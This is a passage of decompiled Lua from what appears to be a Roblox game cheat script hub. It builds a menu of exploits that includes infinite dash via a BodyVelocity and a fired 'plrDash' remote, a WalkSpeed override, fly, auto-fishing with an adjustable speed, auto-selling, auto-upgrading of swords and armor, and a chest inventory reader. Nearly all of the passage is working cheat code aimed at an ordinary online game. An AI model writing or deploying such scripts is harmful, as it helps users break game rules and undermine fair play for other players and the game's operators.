                        pcall_9 = 0.0
                        new_5 = 1.0
                        new_4 = new_4(armor_stats, pcall_9, new_5)
                        magnitude_2 = (magnitude_2) * (new_4)
                        if magnitude_2 ~= nil then
                            unit = magnitude_2.Unit
                        else
                            unit = nil
                        end
                    else
                        magnitude_2 = capture_1_205569.value
                        if magnitude_2 ~= nil then
                            magnitude_2 = magnitude_2.Position
                        else
                            magnitude_2 = nil
                        end
                        new_4 = capture_1_205569.value
                        if new_4 ~= nil then
                            new_4 = new_4.Position
                        else
                            new_4 = nil
                        end
                        new_4 = (new_4) + (material)
                        magnitude_2 = (magnitude_2) - (new_4)
                        if magnitude_2 ~= nil then
                            magnitude_2 = magnitude_2.Unit
                        else
                            magnitude_2 = nil
                        end
                        magnitude_2 = -(magnitude_2)
                        new_4 = Vector3.new
                        armor_stats = 1.0
                        pcall_9 = 0.0
                        new_5 = 1.0
                        new_4 = new_4(armor_stats, pcall_9, new_5)
                        magnitude_2 = (magnitude_2) * (new_4)
                        if magnitude_2 ~= nil then
                            unit = magnitude_2.Unit
                        else
                            unit = nil
                        end
                    end
                    magnitude_2 = 50.0
                    new_4 = 0.14
                    armor_stats = armor
                    if armor_stats then
                        armor_stats = armor
                        if armor_stats ~= nil then
                            armor_stats = armor_stats.armorStats
                        else
                            armor_stats = nil
                        end
                        if armor_stats then
                            armor_stats = armor
                            if armor_stats ~= nil then
                                armor_stats = armor_stats.armorStats
                            else
                                armor_stats = nil
                            end
                            if armor_stats ~= nil then
                                armor_stats = armor_stats.DashForce
                            else
                                armor_stats = nil
                            end
                            magnitude_2 = (armor_stats) * (0.5)
                            armor_stats = armor
                            if armor_stats ~= nil then
                                armor_stats = armor_stats.armorStats
                            else
                                armor_stats = nil
                            end
                            if armor_stats ~= nil then
                                new_4 = armor_stats.DashDur
                            else
                                new_4 = nil
                            end
                        end
                    end
                    armor_stats = (unit) * (magnitude_2)
                    if floor_material then
                        pcall_9 = (armor_stats) * (1.65)
                        new_5 = Vector3.new
                        math_8 = 0.0
                        math_9 = 3.0
                        math_10 = 0.0
                        new_5 = new_5(math_8, math_9, math_10)
                        armor_stats = (pcall_9) + (new_5)
                        pcall_9 = pcall
                        local capture_94_20225_2, capture_94_20226_2, capture_94_20227_2 = val_223, capture_1_205569, capture_1_205572
                        new_5 = function()
                            local val_224, cframe_2
                            local effect_parts = capture_94_20225_2.value
                            if effect_parts ~= nil then
                                effect_parts = effect_parts.effectParts
                            else
                                effect_parts = nil
                            end
                            local clone = effect_parts
                            if effect_parts then
                                effect_parts = effect_parts.FindFirstChild
                            else
                                effect_parts = nil
                            end
                            local air_dash_particles = "airDashParticles"
                            effect_parts = effect_parts(clone, air_dash_particles)
                            if effect_parts then
                                air_dash_particles = effect_parts
                                if effect_parts then
                                    clone = effect_parts.Clone
                                else
                                    clone = nil
                                end
                                clone = clone(air_dash_particles)
                                val_224 = clone
                                if clone then
                                    air_dash_particles = clone.PivotTo
                                else
                                    air_dash_particles = nil
                                end
                                cframe_2 = capture_94_20226_2.value
                                if cframe_2 ~= nil then
                                    cframe_2 = cframe_2.CFrame
                                else
                                    cframe_2 = nil
                                end
                                air_dash_particles(val_224, cframe_2)
                                air_dash_particles = workspace
                                if clone then
                                    clone.Parent = air_dash_particles
                                end
                                air_dash_particles = capture_94_20227_2.value
                                val_224 = air_dash_particles
                                if air_dash_particles then
                                    air_dash_particles = air_dash_particles.AddItem
                                else
                                    air_dash_particles = nil
                                end
                                air_dash_particles(val_224, clone, 2.0)
                            end
                            return
                        end
                        pcall_9(new_5)
                    else
                        pcall_9 = pcall
                        local capture_94_22017_2, capture_94_22018_2, capture_94_22019_2 = val_223, capture_1_205569, capture_1_205572
                        pcall_9(function()
                            local val_225, cframe_3
                            local effect_parts_2 = capture_94_22017_2.value
                            if effect_parts_2 ~= nil then
                                effect_parts_2 = effect_parts_2.effectParts
                            else
                                effect_parts_2 = nil
                            end
                            local clone_2 = effect_parts_2
                            if effect_parts_2 then
                                effect_parts_2 = effect_parts_2.FindFirstChild
                            else
                                effect_parts_2 = nil
                            end
                            local dash_fx = "dashFX"
                            effect_parts_2 = effect_parts_2(clone_2, dash_fx)
                            if effect_parts_2 then
                                dash_fx = effect_parts_2
                                if effect_parts_2 then
                                    clone_2 = effect_parts_2.Clone
                                else
                                    clone_2 = nil
                                end
                                clone_2 = clone_2(dash_fx)
                                val_225 = clone_2
                                if clone_2 then
                                    dash_fx = clone_2.PivotTo
                                else
                                    dash_fx = nil
                                end
                                cframe_3 = capture_94_22018_2.value
                                if cframe_3 ~= nil then
                                    cframe_3 = cframe_3.CFrame
                                else
                                    cframe_3 = nil
                                end
                                dash_fx(val_225, cframe_3)
                                dash_fx = workspace
                                if clone_2 then
                                    clone_2.Parent = dash_fx
                                end
                                dash_fx = capture_94_22019_2.value
                                val_225 = dash_fx
                                if dash_fx then
                                    dash_fx = dash_fx.AddItem
                                else
                                    dash_fx = nil
                                end
                                dash_fx(val_225, clone_2, 2.0)
                            end
                            return
                        end)
                        pcall_9 = pcall
                        local capture_94_23553_2 = val_223
                        new_5 = function()
                            local remotes_6 = capture_94_23553_2.value
                            if remotes_6 ~= nil then
                                remotes_6 = remotes_6.remotes
                            else
                                remotes_6 = nil
                            end
                            if remotes_6 ~= nil then
                                remotes_6 = remotes_6.plrDash
                            else
                                remotes_6 = nil
                            end
                            local val_226 = remotes_6
                            if remotes_6 then
                                remotes_6 = remotes_6.FireServer
                            else
                                remotes_6 = nil
                            end
                            remotes_6(val_226)
                            return
                        end
                        pcall_9(new_5)
                    end
                    pcall_9 = (Instance.new)("BodyVelocity")
                    if pcall_9 then
                        pcall_9.Name = "dashForce"
                    end
                    new_5 = Vector3.new
                    math_8 = math
                    if math_8 ~= nil then
                        math_8 = math_8.huge
                    else
                        math_8 = nil
                    end
                    math_9 = math
                    if math_9 ~= nil then
                        math_9 = math_9.huge
                    else
                        math_9 = nil
                    end
                    math_10 = math
                    if math_10 ~= nil then
                        math_10 = math_10.huge
                    else
                        math_10 = nil
                    end
                    new_5 = new_5(math_8, math_9, math_10)
                    if pcall_9 then
                        pcall_9.MaxForce = new_5
                    end
                    new_5 = math
                    if new_5 ~= nil then
                        new_5 = new_5.huge
                    else
                        new_5 = nil
                    end
                    if pcall_9 then
                        pcall_9.P = new_5
                    end
                    if pcall_9 then
                        pcall_9.Velocity = armor_stats
                    end
                    new_5 = capture_1_205569.value
                    if pcall_9 then
                        pcall_9.Parent = new_5
                    end
                    new_5 = capture_1_205572.value
                    math_8 = new_5
                    if new_5 then
                        new_5 = new_5.AddItem
                    else
                        new_5 = nil
                    end
                    new_5(math_8, pcall_9, new_4)
                    new_5 = pcall
                    local val_227, capture_94_31234_2, capture_94_31235_2 = floor_material, val_223, capture_1_205570
                    new_5(function()
                        local val_228
                        local air_dash = val_227
                        if air_dash then
                            air_dash = "airDash"
                            if not air_dash then
                                air_dash = "dash"
                            end
                        else
                            air_dash = "dash"
                        end
                        local anims = capture_94_31234_2.value
                        if anims ~= nil then
                            anims = anims.Anims
                        else
                            anims = nil
                        end
                        local load_animation = anims
                        if anims then
                            anims = anims.FindFirstChild
                        else
                            anims = nil
                        end
                        local play_2 = air_dash
                        anims = anims(load_animation, play_2)
                        if anims then
                            load_animation = capture_94_31235_2.value
                            play_2 = load_animation
                            if load_animation then
                                load_animation = load_animation.LoadAnimation
                            else
                                load_animation = nil
                            end
                            load_animation = load_animation(play_2, anims)
                            val_228 = load_animation
                            if load_animation then
                                play_2 = load_animation.Play
                            else
                                play_2 = nil
                            end
                            play_2(val_228)
                            play_2 = val_227
                            if play_2 then
                                val_228 = load_animation
                                if load_animation then
                                    play_2 = load_animation.AdjustSpeed
                                else
                                    play_2 = nil
                                end
                                play_2(val_228, 2.0)
                            end
                        end
                        return
                    end)
                    new_5 = pcall
                    local val_229, capture_94_32770_2, capture_94_32771_2 = floor_material, capture_1_205569, capture_1_205572
                    new_5(function()
                        local val_230 = (Instance.new)("Sound")
                        local play_3 = val_229
                        if play_3 then
                            play_3 = "rbxassetid://6128977275"
                            if not play_3 then
                                play_3 = "rbxassetid://18465949183"
                            end
                        else
                            play_3 = "rbxassetid://18465949183"
                        end
                        if val_230 then
                            val_230.SoundId = play_3
                        end
                        play_3 = val_229
                        if play_3 then
                            play_3 = 5.0
                            if not play_3 then
                                play_3 = 1.0
                            end
                        else
                            play_3 = 1.0
                        end
                        if val_230 then
                            val_230.Volume = play_3
                        end
                        play_3 = capture_94_32770_2.value
                        if val_230 then
                            val_230.Parent = play_3
                        end
                        local val_231 = val_230
                        if val_230 then
                            play_3 = val_230.Play
                        else
                            play_3 = nil
                        end
                        play_3(val_231)
                        play_3 = capture_94_32771_2.value
                        val_231 = play_3
                        if play_3 then
                            play_3 = play_3.AddItem
                        else
                            play_3 = nil
                        end
                        play_3(val_231, val_230, 2.0)
                        return
                    end)
                    return
                end
            end
            return
        end
    end
    make_tab = "InputBegan"
    if tbl_21.value ~= nil then
        make_tab = tbl_21.value[make_tab]
    else
        make_tab = nil
    end
    tbl_7 = "Connect"
    make_tab_2 = make_tab
    if make_tab then
        make_tab = make_tab[tbl_7]
    else
        make_tab = nil
    end
    do
        local val_232, capture_1_207874 = tbl_3, tbl_25
        tbl_7 = function(argument_1, argument_2)
            local inf_dash_force, key_code
            if argument_2 then
                return
            else
                inf_dash_force = val_232
                if inf_dash_force ~= nil then
                    inf_dash_force = inf_dash_force.InfDashForce
                else
                    inf_dash_force = nil
                end
                if inf_dash_force then
                    if argument_1 ~= nil then
                        inf_dash_force = argument_1.KeyCode
                    else
                        inf_dash_force = nil
                    end
                    key_code = Enum.KeyCode
                    if key_code ~= nil then
                        key_code = key_code.Q
                    else
                        key_code = nil
                    end
                    if (inf_dash_force == key_code) then
                        inf_dash_force = capture_1_207874.value
                        inf_dash_force()
                    end
                end
                return
            end
        end
    end
    make_tab(make_tab_2, tbl_7)
    make_tab = task.spawn
    do
        local val_233, val_234, val_235 = tbl_24, tbl_3, tbl_25
        make_tab_2 = function()
            local mouse_button1_click_2, val_236
            local pcall_10 = pcall
            local capture_101_513_2 = val_233
            local handler_23 = function()
                local player_gui_2 = capture_101_513_2.value
                if player_gui_2 ~= nil then
                    player_gui_2 = player_gui_2.PlayerGui
                else
                    player_gui_2 = nil
                end
                local val_237 = player_gui_2
                if player_gui_2 then
                    player_gui_2 = player_gui_2.WaitForChild
                else
                    player_gui_2 = nil
                end
                player_gui_2 = player_gui_2(val_237, "gameUI")
                val_237 = player_gui_2
                if player_gui_2 then
                    player_gui_2 = player_gui_2.WaitForChild
                else
                    player_gui_2 = nil
                end
                player_gui_2 = player_gui_2(val_237, "HUD")
                val_237 = player_gui_2
                if player_gui_2 then
                    player_gui_2 = player_gui_2.WaitForChild
                else
                    player_gui_2 = nil
                end
                return player_gui_2(val_237, "mobiledash")
            end
            if pcall_10(handler_23) then
                if handler_23 then
                    if handler_23 ~= nil then
                        mouse_button1_click_2 = handler_23.MouseButton1Click
                    else
                        mouse_button1_click_2 = nil
                    end
                    val_236 = mouse_button1_click_2
                    if mouse_button1_click_2 then
                        mouse_button1_click_2 = mouse_button1_click_2.Connect
                    else
                        mouse_button1_click_2 = nil
                    end
                    local val_238, capture_101_2818_2 = val_234, val_235
                    mouse_button1_click_2(val_236, function()
                        local inf_dash_force_2 = val_238
                        if inf_dash_force_2 ~= nil then
                            inf_dash_force_2 = inf_dash_force_2.InfDashForce
                        else
                            inf_dash_force_2 = nil
                        end
                        if inf_dash_force_2 then
                            inf_dash_force_2 = capture_101_2818_2.value
                            inf_dash_force_2()
                        end
                        return
                    end)
                end
            end
            return
        end
    end
    make_tab(make_tab_2)
    tbl_7 = "AddToggle"
    make_tab_2 = handler_12
    if handler_12 then
        make_tab = handler_12[tbl_7]
    else
        make_tab = nil
    end
    tbl_7 = {}
    tbl_7.Name = handler("Player Speed")
    handler_result = false
    tbl_7.Default = handler_result
    tbl_7.Flag = "Speed"
    do
        local val_239, capture_1_213250, val_240 = tbl_3, tbl_11, sphub_first_time_path
        handler_result = function(argument_1)
            local value_20, val_241
            local parent_3 = val_239
            if parent_3 then
                parent_3.Speed = argument_1
            end
            parent_3 = capture_1_213250.value
            if parent_3 then
                parent_3 = capture_1_213250.value
                if parent_3 ~= nil then
                    parent_3 = parent_3.Parent
                else
                    parent_3 = nil
                end
                if parent_3 then
                    if argument_1 then
                        parent_3 = val_240
                        if parent_3 ~= nil then
                            parent_3 = parent_3.Flags
                        else
                            parent_3 = nil
                        end
                        if parent_3 then
                            parent_3 = val_240
                            if parent_3 ~= nil then
                                parent_3 = parent_3.Flags
                            else
                                parent_3 = nil
                            end
                            if parent_3 ~= nil then
                                parent_3 = parent_3.SpeedValue
                            else
                                parent_3 = nil
                            end
                        end
                        if parent_3 then
                            if parent_3 ~= nil then
                                value_20 = parent_3.Value
                            else
                                value_20 = nil
                            end
                            if not value_20 then
                                value_20 = 21.0
                            end
                        else
                            value_20 = 21.0
                        end
                        val_241 = capture_1_213250.value
                        if val_241 then
                            val_241.WalkSpeed = value_20
                        end
                    else
                        parent_3 = capture_1_213250.value
                        if parent_3 then
                            parent_3.WalkSpeed = 21.0
                        end
                    end
                end
            end
            return
        end
    end
    tbl_7.Callback = handler_result
    make_tab(make_tab_2, tbl_7)
    tbl_7 = "AddSlider"
    make_tab_2 = handler_12
    if handler_12 then
        make_tab = handler_12[tbl_7]
    else
        make_tab = nil
    end
    tbl_7 = {}
    tbl_7.Name = handler("Speed Value")
    tbl_7.Min = 21.0
    tbl_7.Max = 60.0
    tbl_7.Default = 21.0
    tbl_7.Increment = 1.0
    handler_result = "ValueName"
    info = handler
    tbl_26.value = "Speed"
    info = info(tbl_26.value)
    if tbl_7 then
        tbl_7[handler_result] = info
    end
    tbl_7.Flag = "SpeedValue"
    do
        local val_242, capture_1_220930 = tbl_3, tbl_11
        handler_result = function(argument_1)
            local speed = val_242
            if speed then
                speed.SpeedValue = argument_1
            end
            speed = val_242
            if speed ~= nil then
                speed = speed.Speed
            else
                speed = nil
            end
            if speed then
                speed = capture_1_220930.value
                if speed then
                    speed = capture_1_220930.value
                    if speed then
                        speed.WalkSpeed = argument_1
                    end
                end
            end
            return
        end
    end
    tbl_7.Callback = handler_result
    make_tab(make_tab_2, tbl_7)
    tbl_7 = "AddToggle"
    make_tab_2 = handler_12
    if handler_12 then
        make_tab = handler_12[tbl_7]
    else
        make_tab = nil
    end
    tbl_7 = {}
    tbl_7.Name = handler("Fly")
    handler_result = false
    tbl_7.Default = handler_result
    tbl_7.Flag = "Fly"
    do
        local val_243 = tbl_3
        handler_result = function(argument_1)
            local val_244 = val_243
            if val_244 then
                val_244.Fly = argument_1
            end
            return
        end
    end
    tbl_7.Callback = handler_result
    make_tab(make_tab_2, tbl_7)
    tbl_7 = "AddSlider"
    make_tab_2 = handler_12
    if handler_12 then
        make_tab = handler_12[tbl_7]
    else
        make_tab = nil
    end
    tbl_7 = {}
    tbl_7.Name = handler("Fly Speed")
    tbl_7.Min = 20.0
    tbl_7.Max = 100.0
    tbl_7.Default = 40.0
    tbl_7.Increment = 1.0
    handler_result = "ValueName"
    info = handler
    tbl_26.value = "Speed"
    info = info(tbl_26.value)
    if tbl_7 then
        tbl_7[handler_result] = info
    end
    tbl_7.Flag = "FlySpeed"
    do
        local val_245 = tbl_3
        handler_result = function(argument_1)
            local val_246 = val_245
            if val_246 then
                val_246.FlySpeed = argument_1
            end
            return
        end
    end
    tbl_7.Callback = handler_result
    make_tab(make_tab_2, tbl_7)
    make_tab_2 = make_window
    if make_window then
        make_tab = make_window.MakeTab
    else
        make_tab = nil
    end
    tbl_7 = {}
    tbl_7.Name = handler("Fishing")
    tbl_7.Icon = "rbxassetid://122078605083855"
    make_tab = make_tab(make_tab_2, tbl_7)
    tbl_7 = make_tab
    if make_tab then
        make_tab_2 = make_tab.AddSection
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Fishing"
    handler_result.Name = info(tbl_26.value)
    make_tab_2(tbl_7, handler_result)
    handler_result = "AddToggle"
    tbl_7 = make_tab
    if make_tab then
        make_tab_2 = make_tab[handler_result]
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Auto Fish"
    handler_result.Name = info(tbl_26.value)
    info = "PremiumOnly"
    tbl_26.value = false
    if handler_result then
        handler_result[info] = false
    end
    info = handler
    tbl_26.value = "Enable it and fishing normally, it will work when you catch the fish"
    handler_result.Desc = info(tbl_26.value)
    info = false
    handler_result.Default = info
    handler_result.Flag = "AutoFish"
    do
        local val_247 = tbl_3
        info = function(argument_1)
            local val_248 = val_247
            if val_248 then
                val_248.AutoFish = argument_1
            end
            return
        end
    end
    handler_result.Callback = info
    make_tab_2(tbl_7, handler_result)
    handler_result = "AddSlider"
    tbl_7 = make_tab
    if make_tab then
        make_tab_2 = make_tab[handler_result]
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Fishing Speed"
    handler_result.Name = info(tbl_26.value)
    info = "Min"
    tbl_26.value = 1.0
    if handler_result then
        handler_result[info] = tbl_26.value
    end
    info = "Max"
    tbl_26.value = 300.0
    if handler_result then
        handler_result[info] = tbl_26.value
    end
    handler_result.Default = 100.0
    info = "Increment"
    tbl_26.value = 1.0
    if handler_result then
        handler_result[info] = tbl_26.value
    end
    info = "ValueName"
    tbl_26.value = handler
    tbl_27.value = "x10ms"
    tbl_26.value = tbl_26.value(tbl_27.value)
    if handler_result then
        handler_result[info] = tbl_26.value
    end
    handler_result.Flag = "FishSpeed"
    do
        local val_249 = tbl_3
        info = function(argument_1)
            local val_250 = val_249
            local val_251 = (argument_1) / (100.0)
            if val_250 then
                val_250.FishSpeed = val_251
            end
            return
        end
    end
    handler_result.Callback = info
    make_tab_2(tbl_7, handler_result)
    tbl_7 = make_tab
    if make_tab then
        make_tab_2 = make_tab.AddSection
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Sell"
    handler_result.Name = info(tbl_26.value)
    make_tab_2(tbl_7, handler_result)
    tbl_7 = make_tab
    if make_tab then
        make_tab_2 = make_tab.AddDropdown
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Select Items"
    handler_result.Name = info(tbl_26.value)
    handler_result.Options = itemKeys
    info = "MultiSelect"
    tbl_26.value = true
    if handler_result then
        handler_result[info] = tbl_26.value
    end
    handler_result.Default = {}
    info = "SellItems"
    handler_result.Flag = info
    do
        local val_252 = handler_7
        info = function(argument_1)
            val_252(argument_1)
            return
        end
    end
    handler_result.Callback = info
    make_tab_2 = make_tab_2(tbl_7, handler_result)
    SellDropdown = make_tab_2
    handler_result = "AddToggle"
    tbl_7 = make_tab
    if make_tab then
        make_tab_2 = make_tab[handler_result]
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Auto Sell"
    handler_result.Name = info(tbl_26.value)
    handler_result.Default = false
    handler_result.Flag = "AutoSell"
    handler_result.Callback = function(argument_1)
        autoSell = argument_1
        return
    end
    make_tab_2(tbl_7, handler_result)
    tbl_7 = make_tab
    if make_tab then
        make_tab_2 = make_tab.AddButton
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Sell Selected All"
    info = info(tbl_26.value)
    handler_result.Name = info
    do
        local val_253 = handler_8
        info = function()
            val_253(true)
            return
        end
    end
    handler_result.Callback = info
    make_tab_2(tbl_7, handler_result)
    tbl_7 = make_window
    if make_window then
        make_tab_2 = make_window.MakeTab
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Inventory"
    handler_result.Name = info(tbl_26.value)
    handler_result.Icon = "rbxassetid://10709769841"
    make_tab_2 = make_tab_2(tbl_7, handler_result)
    handler_result = make_tab_2
    if make_tab_2 then
        tbl_7 = make_tab_2.AddSection
    else
        tbl_7 = nil
    end
    info = {}
    tbl_26.value = handler
    tbl_27.value = "Swords"
    tbl_26.value = tbl_26.value(tbl_27.value)
    info.Name = tbl_26.value
    tbl_7(handler_result, info)
    info = "AddToggle"
    handler_result = make_tab_2
    if make_tab_2 then
        tbl_7 = make_tab_2[info]
    else
        tbl_7 = nil
    end
    info = {}
    tbl_26.value = handler
    tbl_27.value = "Auto Upgrade Swords"
    tbl_26.value = tbl_26.value(tbl_27.value)
    info.Name = tbl_26.value
    tbl_26.value = handler
    tbl_27.value = "Automatically upgrades all swords that need upgrades (runs in background)"
    tbl_26.value = tbl_26.value(tbl_27.value)
    info.Desc = tbl_26.value
    tbl_26.value = false
    info.Default = tbl_26.value
    info.Flag = "AutoUpgradeSwords"
    do
        local val_254 = tbl_3
        tbl_26.value = function(argument_1)
            local val_255 = val_254
            if val_255 then
                val_255.AutoUpgradeSwords = argument_1
            end
            return
        end
    end
    info.Callback = tbl_26.value
    tbl_7(handler_result, info)
    handler_result = make_tab_2
    if make_tab_2 then
        tbl_7 = make_tab_2.AddSection
    else
        tbl_7 = nil
    end
    info = {}
    tbl_26.value = handler
    tbl_27.value = "Armors"
    tbl_26.value = tbl_26.value(tbl_27.value)
    info.Name = tbl_26.value
    tbl_7(handler_result, info)
    info = "AddToggle"
    handler_result = make_tab_2
    if make_tab_2 then
        tbl_7 = make_tab_2[info]
    else
        tbl_7 = nil
    end
    info = {}
    tbl_26.value = handler
    tbl_27.value = "Auto Upgrade Armors"
    tbl_26.value = tbl_26.value(tbl_27.value)
    info.Name = tbl_26.value
    tbl_26.value = handler
    tbl_27.value = "Automatically upgrades all armors that need upgrades (runs in background)"
    tbl_26.value = tbl_26.value(tbl_27.value)
    info.Desc = tbl_26.value
    tbl_26.value = false
    info.Default = tbl_26.value
    info.Flag = "AutoUpgradeArmors"
    do
        local val_256 = tbl_3
        tbl_26.value = function(argument_1)
            local val_257 = val_256
            if val_257 then
                val_257.AutoUpgradeArmors = argument_1
            end
            return
        end
    end
    info.Callback = tbl_26.value
    tbl_7(handler_result, info)
    handler_result = make_tab_2
    if make_tab_2 then
        tbl_7 = make_tab_2.AddSection
    else
        tbl_7 = nil
    end
    info = {}
    tbl_26.value = handler
    tbl_27.value = "Chests"
    tbl_26.value = tbl_26.value(tbl_27.value)
    info.Name = tbl_26.value
    tbl_7(handler_result, info)
    handler_result = make_tab_2
    if make_tab_2 then
        tbl_7 = make_tab_2.AddParagraph
    else
        tbl_7 = nil
    end
    info = {}
    tbl_26.value = "Title"
    tbl_27.value = handler
    tbl_28.value = "Your Chests"
    tbl_27.value = tbl_27.value(tbl_28.value)
    if info then
        info[tbl_26.value] = tbl_27.value
    end
    tbl_26.value = "Content"
    tbl_27.value = handler
    tbl_28.value = "Loading..."
    tbl_27.value = tbl_27.value(tbl_28.value)
    if info then
        info[tbl_26.value] = tbl_27.value
    end
    tbl_7 = tbl_7(handler_result, info)
    handler_result = game
    info = handler_result
    handler_result = handler_result.GetService
    tbl_26.value = "Players"
    handler_result = handler_result(info, tbl_26.value)
    if handler_result ~= nil then
        handler_result = handler_result.LocalPlayer
    else
        handler_result = nil
    end
    do
        local val_258 = handler_result
        info = function()
            local game_ui_2, armory, inventory, clip
            local find_first_child_12 = val_258
            local find_first_child_13 = find_first_child_12
            if find_first_child_12 then
                find_first_child_12 = find_first_child_12.FindFirstChild
            else
                find_first_child_12 = nil
            end
            local player_gui_3 = "PlayerGui"
            find_first_child_12 = find_first_child_12(find_first_child_13, player_gui_3)
            if not find_first_child_12 then
                find_first_child_13 = nil
                return find_first_child_13
            else
                player_gui_3 = find_first_child_12
                if find_first_child_12 then
                    find_first_child_13 = find_first_child_12.FindFirstChild
                else
                    find_first_child_13 = nil
                end
                game_ui_2 = "gameUI"
                find_first_child_13 = find_first_child_13(player_gui_3, game_ui_2)
                if not find_first_child_13 then
                    player_gui_3 = nil
                    return player_gui_3
                else
                    game_ui_2 = find_first_child_13
                    if find_first_child_13 then
                        player_gui_3 = find_first_child_13.FindFirstChild
                    else
                        player_gui_3 = nil
                    end
                    armory = "armory"
                    player_gui_3 = player_gui_3(game_ui_2, armory)
                    if not player_gui_3 then
                        game_ui_2 = nil
                        return game_ui_2
                    else
                        armory = player_gui_3
                        if player_gui_3 then
                            game_ui_2 = player_gui_3.FindFirstChild
                        else
                            game_ui_2 = nil
                        end
                        inventory = "inventory"
                        game_ui_2 = game_ui_2(armory, inventory)
                        if not game_ui_2 then
                            armory = nil
                            return armory
                        else
                            inventory = game_ui_2
                            if game_ui_2 then
                                armory = game_ui_2.FindFirstChild
                            else
                                armory = nil
                            end
                            clip = "clip"
                            armory = armory(inventory, clip)
                            if not armory then
                                inventory = nil
                                return inventory
                            else
                                clip = armory
                                if armory then
                                    inventory = armory.FindFirstChild
                                else
                                    inventory = nil
                                end
                                return inventory(clip, "Loot")
                            end
                        end
                    end
                end
            end
        end
    end
    do
        local val_259 = info
        tbl_26.value = function()
            local pack_result_78
            local tbl_55, tbl_56, pairs_13, get_children_5, val_259_result, pack_result_79, pack_result_80, pack_result_81, pack_result_82, pack_result_83, pack_result_84, pack_result_85, pack_result_86, pack_result_87, pack_result_88, pack_result_89
            local val_259_result_2 = val_259()
            if not val_259_result_2 then
                tbl_55 = {}
                tbl_56 = {}
                return tbl_55, tbl_56
            else
                tbl_55 = {}
                tbl_56 = {}
                pairs_13 = pairs
                val_259_result = val_259_result_2
                if val_259_result_2 then
                    get_children_5 = val_259_result_2.GetChildren
                else
                    get_children_5 = nil
                end
                pack_result_78 = pack(get_children_5(val_259_result))
                if pack_result_78.n >= 1 then
                    get_children_5 = pack_result_78[1]
                end
                if pack_result_78.n >= 2 then
                    val_259_result = pack_result_78[2]
                end
                if pack_result_78.n >= 3 then
                    pack_result_79 = pack_result_78[3]
                end
                if pack_result_78.n >= 4 then
                    pack_result_80 = pack_result_78[4]
                end
                if pack_result_78.n >= 5 then
                    pack_result_81 = pack_result_78[5]
                end
                if pack_result_78.n >= 6 then
                    pack_result_82 = pack_result_78[6]
                end
                if pack_result_78.n >= 7 then
                    pack_result_83 = pack_result_78[7]
                end
                if pack_result_78.n >= 8 then
                    pack_result_84 = pack_result_78[8]
                end
                if pack_result_78.n >= 9 then
                    pack_result_85 = pack_result_78[9]
                end
                if pack_result_78.n >= 10 then
                    pack_result_86 = pack_result_78[10]
                end
                if pack_result_78.n >= 11 then
                    pack_result_87 = pack_result_78[11]
                end
                if pack_result_78.n >= 12 then
                    pack_result_88 = pack_result_78[12]
                end
                if pack_result_78.n >= 13 then
                    pack_result_89 = pack_result_78[13]
                end
                pairs_13 = pairs_13(unpack(pack_result_78, 1, pack_result_78.n))
                while true do
                    pack_result_79 = pairs_13(get_children_5, val_259_result)
                    if pack_result_79 ~= nil then
                        val_259_result = pack_result_79
                        pack_result_82 = pack_result_80
                        if pack_result_80 then
                            pack_result_81 = pack_result_80.FindFirstChild
                        else
                            pack_result_81 = nil
                        end
                        pack_result_83 = "copies"
                        pack_result_81 = pack_result_81(pack_result_82, pack_result_83)
                        if pack_result_81 then
                            pack_result_83 = pack_result_81
                            if pack_result_81 then
                                pack_result_82 = pack_result_81.IsA
                            else
                                pack_result_82 = nil
                            end
                            pack_result_84 = "TextLabel"
                            pack_result_82 = pack_result_82(pack_result_83, pack_result_84)
                            if pack_result_82 then
                                if pack_result_80 ~= nil then
                                    pack_result_82 = pack_result_80.Name
                                else
                                    pack_result_82 = nil
                                end
                                if pack_result_81 ~= nil then
                                    pack_result_83 = pack_result_81.Text
                                else
                                    pack_result_83 = nil
                                end
                                pack_result_84 = table
                                if pack_result_84 ~= nil then
                                    pack_result_84 = pack_result_84.insert
                                else
                                    pack_result_84 = nil
                                end
                                pack_result_84(tbl_55, pack_result_82)
                                pack_result_84 = table
                                if pack_result_84 ~= nil then
                                    pack_result_84 = pack_result_84.insert
                                else
                                    pack_result_84 = nil
                                end
                                pack_result_85 = tbl_56
                                pack_result_86 = pack_result_82
                                pack_result_87 = " (x"
                                pack_result_88 = pack_result_83
                                pack_result_89 = ")"
                                pack_result_86 = concatenate({
                                    pack_result_86,
                                    pack_result_87,
                                    pack_result_88,
                                    pack_result_89,
                                })
                                pack_result_84(pack_result_85, pack_result_86)
                            end
                        end
                    else
                        break
                    end
                end
                return tbl_55, tbl_56
            end
        end
    end
    do
        local capture_1_285185, val_260, val_261 = tbl_26, tbl_7, handler
        tbl_27.value = function()
            local pack_result_90
            local val_262, val_263, table_6, no_chests, val_264
            ;
            (capture_1_285185.value)()
            local set_2 = #(val_262)
            if (0.0 < set_2) then
                set_2 = val_260
                val_263 = set_2
                if set_2 then
                    set_2 = set_2.Set
                else
                    set_2 = nil
                end
                table_6 = table
                if table_6 ~= nil then
                    table_6 = table_6.concat
                else
                    table_6 = nil
                end
                no_chests = val_262
                pack_result_90 = pack(table_6(no_chests, "\n"))
                if pack_result_90.n >= 1 then
                    table_6 = pack_result_90[1]
                end
                if pack_result_90.n >= 2 then
                    no_chests = pack_result_90[2]
                end
                if pack_result_90.n >= 3 then
                    val_264 = pack_result_90[3]
                end
                set_2(val_263, unpack(pack_result_90, 1, pack_result_90.n))
            else
                set_2 = val_260
                val_263 = set_2
                if set_2 then
                    set_2 = set_2.Set
                else
                    set_2 = nil
                end
                table_6 = val_261
                no_chests = "No Chests"
                pack_result_90 = pack(table_6(no_chests))
                if pack_result_90.n >= 1 then
                    table_6 = pack_result_90[1]
                end
                if pack_result_90.n >= 2 then
                    no_chests = pack_result_90[2]
                end
                if pack_result_90.n >= 3 then
                    val_264 = pack_result_90[3]
                end
                set_2(val_263, unpack(pack_result_90, 1, pack_result_90.n))
            end
            return
        end
    end
    tbl_28.value = false
    tbl_29.value = {}
    tbl_30.value = false
    tbl_31.value = {}
    do
